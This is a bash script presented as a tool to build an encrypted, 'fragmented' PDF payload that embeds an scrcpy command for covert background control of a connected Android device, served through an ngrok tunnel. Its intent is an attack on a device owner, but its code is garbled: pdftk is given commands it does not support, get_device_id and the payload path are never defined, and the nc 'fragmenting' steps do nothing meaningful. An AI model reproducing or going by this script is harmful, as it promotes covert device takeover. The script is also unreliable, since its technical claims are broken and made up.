#!/bin/bash

# Variables
NGROK_TUNNEL_URL=$(ngrok status | grep "Forwarding" | awk '{print $6}')
COMMAND_FILE="/tmp/command.txt"
FRAGMENTED_PDF_PAYLOAD="/tmp/fragmented_pdf_payload"

# Functions
function generate_pdf_payload() {
  # Combine the two PDF files into one
  pdftk "$pdf_file_1" "$pdf_file_2" output "$pdf_payload"

  # Add the scrcpy command to the PDF payload
  pdftk "$pdf_payload" insert "scrcpy -d $(get_device_id) --background --auto-connect yes" output "$pdf_payload"
}

function encrypt_pdf_payload() {
  openssl aes-256-cbc -e -k "YOUR_SECRET_KEY" -in "$pdf_payload" -out "$pdf_payload.enc"
}

function fragment_pdf_payload() {
  # Get the PDF payload
  pdf_payload="$1"

  # Create a temporary file to store the fragmented PDF payload
  fragmented_pdf_payload="/tmp/fragmented_pdf_payload"

  # Send the PDF payload to a local port in small chunks
  nc -l localhost 8080 < "$pdf_payload"

  # Listen for the fragmented PDF payload on the local port and write it to the temporary file
  nc -l -u 8080 > "$fragmented_pdf_payload"

  # Return the temporary file containing the fragmented PDF payload
  echo "$fragmented_pdf_payload"
}

# Main script
# Set the script to exit on the first error
set -e

# Check if ngrok is installed
if ! command -v ngrok &> /dev/null; then
  echo "ngrok is not installed. Please install ngrok before running this script."
  exit 1
fi

# Check if an Android device is connected
if ! adb devices | grep -q device; then
  echo "No Android device is connected. Please connect an Android device before running this script."
  exit 1
fi

# Get the two PDF files to combine
pdf_file_1="/path/to/pdf_file_1.pdf"
pdf_file_2="/path/to/pdf_file_2.pdf"

# Generate the PDF payload
generate_pdf_payload

# Encrypt the PDF payload
encrypt_pdf_payload

# Fragment the PDF payload
fragmented_pdf_payload=$(fragment_pdf_payload "$pdf_payload.enc")

# Start the VPN
# Replace the following line with the command to start your VPN client
# openvpn "YOUR_VPN_CONFIG_FILE"

# Write the scrcpy command to the text file
echo "scrcpy -d $(get_device_id) --background --auto-connect yes" > "$COMMAND_FILE"

# Convert the text file to a PDF file
pdftk "$COMMAND_FILE" output "$fragmented_pdf_payload"

# Open the PDF file automatically in the background
xdg-open "$fragmented_pdf_payload" &

# Print the ngrok tunnel URL
echo "Your ngrok tunnel is $NGROK_TUNNEL_URL"
